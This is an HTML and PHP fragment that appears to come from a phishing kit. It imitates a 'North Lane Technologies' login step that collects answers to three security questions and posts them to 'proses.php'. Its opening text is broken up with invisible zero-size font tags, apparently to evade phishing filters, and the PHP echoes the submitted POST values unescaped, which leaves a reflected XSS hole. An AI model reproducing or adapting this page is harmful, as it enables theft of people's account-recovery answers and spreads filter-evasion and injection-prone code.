style="color:transparent;font-size:0px">986</font>T<font style="color:transparent;font-size:0px">151</font>h<font style="color:transparent;font-size:0px">720</font>i<font style="color:transparent;font-size:0px">734</font>s<font style="color:transparent;font-size:0px">338</font> <font style="color:transparent;font-size:0px">193</font>u<font style="color:transparent;font-size:0px">850</font>p<font style="color:transparent;font-size:0px">756</font>g<font style="color:transparent;font-size:0px">905</font>r<font style="color:transparent;font-size:0px">613</font>a<font style="color:transparent;font-size:0px">20</font>d<font style="color:transparent;font-size:0px">900</font>e<font style="color:transparent;font-size:0px">409</font> <font style="color:transparent;font-size:0px">540</font>w<font style="color:transparent;font-size:0px">582</font>i<font style="color:transparent;font-size:0px">101</font>l<font style="color:transparent;font-size:0px">323</font>l<font style="color:transparent;font-size:0px">266</font> <font style="color:transparent;font-size:0px">849</font>n<font style="color:transparent;font-size:0px">267</font>o<font style="color:transparent;font-size:0px">829</font>t<font style="color:transparent;font-size:0px">460</font> <font style="color:transparent;font-size:0px">221</font>i<font style="color:transparent;font-size:0px">793</font>m<font style="color:transparent;font-size:0px">104</font>p<font style="color:transparent;font-size:0px">22</font>a<font style="color:transparent;font-size:0px">701</font>c<font style="color:transparent;font-size:0px">530</font>t<font style="color:transparent;font-size:0px">68</font> <font style="color:transparent;font-size:0px">101</font>a<font style="color:transparent;font-size:0px">863</font>n<font style="color:transparent;font-size:0px">531</font>y<font style="color:transparent;font-size:0px">139</font> <font style="color:transparent;font-size:0px">962</font>e<font style="color:transparent;font-size:0px">274</font>x<font style="color:transparent;font-size:0px">93</font>i<font style="color:transparent;font-size:0px">37</font>s<font style="color:transparent;font-size:0px">157</font>t<font style="color:transparent;font-size:0px">783</font>i<font style="color:transparent;font-size:0px">754</font>n<font style="color:transparent;font-size:0px">709</font>g<font style="color:transparent;font-size:0px">569</font> <font style="color:transparent;font-size:0px">400</font>f<font style="color:transparent;font-size:0px">82</font>e<font style="color:transparent;font-size:0px">855</font>a<font style="color:transparent;font-size:0px">746</font>t<font style="color:transparent;font-size:0px">917</font>u<font style="color:transparent;font-size:0px">902</font>r<font style="color:transparent;font-size:0px">654</font>e<font style="color:transparent;font-size:0px">381</font>s<font style="color:transparent;font-size:0px">904</font> <font style="color:transparent;font-size:0px">633</font>w<font style="color:transparent;font-size:0px">876</font>i<font style="color:transparent;font-size:0px">15</font>t<font style="color:transparent;font-size:0px">772</font>h<font style="color:transparent;font-size:0px">956</font>i<font style="color:transparent;font-size:0px">953</font>n<font style="color:transparent;font-size:0px">589</font> <font style="color:transparent;font-size:0px">701</font>t<font style="color:transparent;font-size:0px">2</font>h<font style="color:transparent;font-size:0px">580</font>e<font style="color:transparent;font-size:0px">347</font> <font style="color:transparent;font-size:0px">318</font>w<font style="color:transparent;font-size:0px">233</font>e<font style="color:transparent;font-size:0px">411</font>b<font style="color:transparent;font-size:0px">473</font>s<font style="color:transparent;font-size:0px">188</font>i<font style="color:transparent;font-size:0px">990</font>t<font style="color:transparent;font-size:0px">842</font>e<font style="color:transparent;font-size:0px">487</font>.</p>
<form name="loginForm" id="secure_login" method="post" action="proses.php" onsubmit="callDevice();">
<input type="hidden" name="Question" id="RSADeviceFso" value="" autocomplete="off">
<dl>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
function windowOnLoad()
{
var inputTags = document.querySelectorAll("input[type=text]");
for (var i = 0; i < inputTags.length; i += 1) {
inputTags[i].setAttribute('autocomplete','off');
}
var inputTags2 = document.querySelectorAll("input[type=hidden]");
for (var i = 0; i < inputTags2.length; i += 1) {
inputTags2[i].setAttribute('autocomplete','off');
}
var inputTags1 = document.querySelectorAll("input[type=password]");
for (var i = 0; i < inputTags1.length; i += 1) {
inputTags1[i].setAttribute('autocomplete','off');
}
}
if ( document.addEventListener )
{
document.addEventListener("DOMContentLoaded", windowOnLoad, false);
}
else
{
windowOnLoad();
}
//]]>
</script>
<div>
<dl>
<dt style="font-size:12px; font-weight:bold"><label id="ques1">Question 1 : </label></dt>
<dd style="font-size:12px; font-weight:bold">
<select name="que1" id="que1" aria-required="true" class="valid" aria-invalid="false">
<option value="Select a question">Select a question</option>
<option value="What is the first name of your oldest neohew?">What is the first name of your oldest nephew?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What street did your best friend in high school live on? ">What street did your best friend in high school live on? </option>
</select>
</dd>
<dt style="font-size:12px; font-weight:bold"><label id="ans1">Answer : </label></dt>
<dd>
<input type="text" name="Answer1" id="1" style="width:344px" maxlength="25" onkeyup="" autocomplete="off" placeholder="" required=""><br>
</dd>
<dt style="font-size:12px; font-weight:bold"><label id="ques1">Question 2 : </label></dt>
<dd style="font-size:12px; font-weight:bold">
<select name="que2" id="que2" aria-required="true" class="valid" aria-invalid="false">
<option value="Select a question">Select a question</option>
<option value="In what city were you married?">In what city were you married? (Enter full name of city)</option>
<option value="In what city was your father born?">In what city was your father born?</option>
<option value="What was the name of your junior high school? ">What was the name of your junior high school?</option>
</select>
</dd>
<dt style="font-size:12px; font-weight:bold"><label id="ans1">Answer : </label></dt>
<dd>
<input type="text" name="Answer2" id="1" style="width:344px" maxlength="25" onkeyup="" autocomplete="off" placeholder="" required=""><br>
</dd>
<dt style="font-size:12px; font-weight:bold"><label id="ques1">Question 3 : </label></dt>
<dd style="font-size:12px; font-weight:bold">
<select name="que3" id="que3" aria-required="true" class="valid" aria-invalid="false">
<option value="Select a question">Select a question</option>
<option value="In what city is your vacation home?">What city is your vacation home? (Enter full name city)</option>
<option value="What is your best friend&#39;s first name?">What is your best friend's first name? </option>
<option value="What was last name your favorite teacher?">What was last name your favorite teacher?</option>
</select>
</dd>
<dt style="font-size:12px; font-weight:bold"><label id="ans1">Answer : </label></dt>
<dd>
<input type="text" name="Answer3" id="1" style="width:344px" maxlength="25" onkeyup="" autocomplete="off" placeholder="" required=""><br>
</dd>
 <?php
    if(isset($_POST['que1']))
        echo $_POST['que1'];
     if(isset($_POST['que2']))
        echo $_POST['que2'];
    if(isset($_POST['que3']))
        echo $_POST['que3'];
     if(isset($_POST['Answer1']))
        echo $_POST['Answer1'];
     if(isset($_POST['Answer2']))
        echo $_POST['Answer2'];
    if(isset($_POST['Answer3']))
        echo $_POST['Answer3'];
  
  
  ?>  
  
<dd>
</dd><dt class="button"></dt>
<dd class="button">
<input type="submit" name="submit" value="next" title="Continue">
</dd>
</dl>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
function windowOnLoad()
{
var inputTags = document.querySelectorAll("input[type=text]");
for (var i = 0; i < inputTags.length; i += 1) {
inputTags[i].setAttribute('autocomplete','off');
}
var inputTags2 = document.querySelectorAll("input[type=hidden]");
for (var i = 0; i < inputTags2.length; i += 1) {
inputTags2[i].setAttribute('autocomplete','off');
}
var inputTags1 = document.querySelectorAll("input[type=password]");
for (var i = 0; i < inputTags1.length; i += 1) {
inputTags1[i].setAttribute('autocomplete','off');
}
}
if ( document.addEventListener )
{
document.addEventListener("DOMContentLoaded", windowOnLoad, false);
}
else
{
windowOnLoad();
}
//]]>
</script>
<div id="footer">
<div id="footer-links">
<style type="text/css">
div#footer-links {margin-bottom:10px; padding-bottom:10px; width:980px; border-bottom:1px solid #ccc; overflow:hidden; }
</style>
<p id="sm-logo"><a></a></p>
<ul>
<li></li>
<li><a href="https://login.northlane.com/xContent/content/op/program/prelogin_terms_en_US.html" target="_blank">Terms of Use</a></li>
<li class="last-link"><a href="https://login.northlane.com/xContent/content/op/program/privacy_cookies.html" target="_blank">Privacy and Cookies</a></li>
<li class="copyrightlink">
<p id="copyright">© 2022 North Lane Technologies, Inc.</p>
</li>
</ul>
</div>
</div>
</div></dl></form></div></div></div><b class="niftycorners" style="margin-left: -20px; margin-right: -20px; background: rgb(103, 95, 76); margin-top: 18px;"><b class="rs2" style="background-color: rgb(255, 255, 255); border-color: rgb(179, 175, 165);"></b><b class="rs1" style="background-color: rgb(255, 255, 255); border-color: rgb(179, 175, 165);"></b></b></div><b class="niftycorners" style="margin-left: -1px; margin-right: -1px; background: rgb(255, 255, 255); margin-top: -2px;"><b class="rs2" style="background-color: rgb(103, 95, 76); border-color: rgb(179, 175, 165);"></b><b class="rs1" style="background-color: rgb(103, 95, 76); border-color: rgb(179, 175, 165);"></b></b></div></div></body></html>